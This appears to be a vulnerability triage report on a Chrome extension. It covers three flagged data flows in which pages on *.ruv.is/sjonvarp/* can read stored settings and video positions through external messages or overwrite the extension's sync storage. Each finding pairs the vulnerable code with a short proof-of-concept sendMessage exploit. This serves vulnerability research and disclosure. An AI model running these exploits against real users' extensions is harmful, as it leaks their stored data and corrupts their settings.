# CoCo Analysis: bckbhgfffkcnfdnblbnhjbldpiikfpjf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 7 (multiple variations of the same vulnerability patterns)

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bckbhgfffkcnfdnblbnhjbldpiikfpjf/opgen_generated_files/bg.js
Line 984 - if( !val || !val.options) return;
Line 988-990 - sendResponse(options[request.settingName]);

**Code:**

```javascript
// Background script - bg.js Lines 977-992
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← External websites can trigger

    function checkOptionsSettings(val) {
      if( !val || !val.options) return;
      var options = val.options;

      if( request.settingName in options  // ← request.settingName controlled by attacker
        && options[request.settingName].enabled
        && options[request.settingName].value ){
          sendResponse(options[request.settingName]); // ← Storage data sent to attacker
        }
    }

    if( request.type === 'checksetting'){
      chrome.storage.sync.get("options", checkOptionsSettings); // Read storage
      return;
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (*.ruv.is/sjonvarp/*)

**Attack:**

```javascript
// From webpage on ruv.is/sjonvarp/*
chrome.runtime.sendMessage(
  'bckbhgfffkcnfdnblbnhjbldpiikfpjf', // Extension ID
  { type: 'checksetting', settingName: 'targetOption' },
  function(response) {
    console.log('Leaked storage data:', response); // Receives options.targetOption
  }
);
```

**Impact:** Information disclosure - external websites matching the externally_connectable pattern (*.ruv.is/sjonvarp/*) can retrieve extension settings stored in chrome.storage.sync by specifying the setting name.

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink (video location retrieval)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bckbhgfffkcnfdnblbnhjbldpiikfpjf/opgen_generated_files/bg.js
Line 1030 - if( !val || !val.videoloc || !val.videoloc.pos || val.videoloc.pos.length <= 0) return;
Line 1036-1040 - sendResponse(existing);

**Code:**

```javascript
// Background script - bg.js Lines 1029-1042
function getCurrentVideoPreviousLocation(request, val){
  if( !val || !val.videoloc || !val.videoloc.pos || val.videoloc.pos.length <= 0) return;
  var pos = val.videoloc.pos;

  var videoId = request.videoId; // ← Attacker-controlled
  var existing = pos.find(element => element.videoId === videoId);

  if( !existing ){
    sendResponse(undefined);
  } else {
    sendResponse(existing); // ← Sends video location data to attacker
  }
}

if( request.type === 'getlocation'){
  if( request.videoId ){
    chrome.storage.sync.get('videoloc', function(val){
      getCurrentVideoPreviousLocation(request, val);
    });
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From webpage on ruv.is/sjonvarp/*
chrome.runtime.sendMessage(
  'bckbhgfffkcnfdnblbnhjbldpiikfpjf',
  { type: 'getlocation', videoId: 'some-video-id' },
  function(response) {
    console.log('Leaked video position:', response); // Gets stored video playback position
  }
);
```

**Impact:** Information disclosure - external websites can retrieve stored video playback positions for specific video IDs.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bckbhgfffkcnfdnblbnhjbldpiikfpjf/opgen_generated_files/bg.js
Line 1004 - var videoPos = request.currentPos;
Line 1022 - chrome.storage.sync.set({videoloc});

**Code:**

```javascript
// Background script - bg.js Lines 997-1023
function saveCurrentVideoLocation(request, val){
  var videoloc = val.videoloc || {};
  var pos = videoloc.pos || [];

  var videoId = request.videoId; // ← Attacker-controlled
  var videoPos = request.currentPos; // ← Attacker-controlled

  var existing = pos.find(element => element.videoId === videoId);
  if( !existing ){
    existing = request; // ← Entire request object (attacker-controlled) stored
    pos.push(existing);
  } else {
    existing.currentPos = videoPos; // ← Attacker data written
  }

  if( pos.length > 10 ){
    pos.splice(0, pos.length - 10);
  }

  videoloc.pos = pos;
  chrome.storage.sync.set({videoloc}); // ← Storage poisoning
}

if( request.type === 'savelocation'){
  if( request.videoId ){
    chrome.storage.sync.get('videoloc', function(val){
      saveCurrentVideoLocation(request, val)
    });
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From webpage on ruv.is/sjonvarp/*
// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
  'bckbhgfffkcnfdnblbnhjbldpiikfpjf',
  {
    type: 'savelocation',
    videoId: 'malicious-id',
    currentPos: 9999,
    extraData: 'attacker-payload' // Entire request object is stored
  }
);

// Step 2: Retrieve the poisoned data
chrome.runtime.sendMessage(
  'bckbhgfffkcnfdnblbnhjbldpiikfpjf',
  { type: 'getlocation', videoId: 'malicious-id' },
  function(response) {
    console.log('Retrieved poisoned data:', response);
    // response contains the malicious data we injected
  }
);
```

**Impact:** Complete storage exploitation chain - external websites can both write arbitrary data to chrome.storage.sync and retrieve it back. This allows persistent data storage under the extension's storage quota that the attacker can read/write at will. While limited to whitelisted domains (*.ruv.is/sjonvarp/*), this constitutes a complete exploitation chain.
